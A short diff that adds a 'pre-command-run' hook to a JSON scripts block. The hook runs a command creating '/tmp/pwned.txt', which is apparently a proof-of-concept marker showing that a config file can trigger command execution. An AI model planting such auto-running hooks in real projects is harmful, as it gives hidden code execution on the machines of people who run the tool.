@@ -1,0 +1,5 @@
+"scripts": {
+    "pre-command-run" : [
+    "/bin/touch /tmp/pwned.txt"
+    ]
+}
